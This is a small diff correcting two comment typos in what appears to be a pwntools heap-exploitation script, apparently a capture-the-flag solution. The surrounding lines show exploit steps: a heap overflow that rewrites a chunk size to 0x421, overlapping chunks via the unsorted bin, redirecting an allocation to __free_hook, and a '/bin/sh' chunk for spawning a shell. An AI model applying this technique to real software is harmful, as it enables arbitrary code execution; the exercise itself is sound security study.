@@ -168,7 +168,7 @@ A = create(io, name="AAAAAAAA")
 overflow(io, "b")
 
 # Use the final free 0x30 chunk to overwrite the size of A's name chunk to 0x420. This 
-# means that when it get's freed, it will end up in the unsorted bin, and we can
+# means that when it gets freed, it will end up in the unsorted bin, and we can
 # remainder chunks from it that will end up overlapping other chunks
 overflow(io, flat({
     0x28: p16(0x421)
@@ -237,7 +237,7 @@ overflow(io, flat({
 
 # Allocate a matrix with the name "/bin/sh". This serves two purposes. First, we use the
 # 0x50 chunk whose pointer we just overwrote, so the next 0x50 chunk we allocate will be
-# at the address of __free_hook. Second, we also get the chunk with "/bin/sh" in at, as
+# at the address of __free_hook. Second, we also get the chunk with "/bin/sh" in it, as
 # mentioned above
 BINSH = create(io, name="/bin/sh")
 
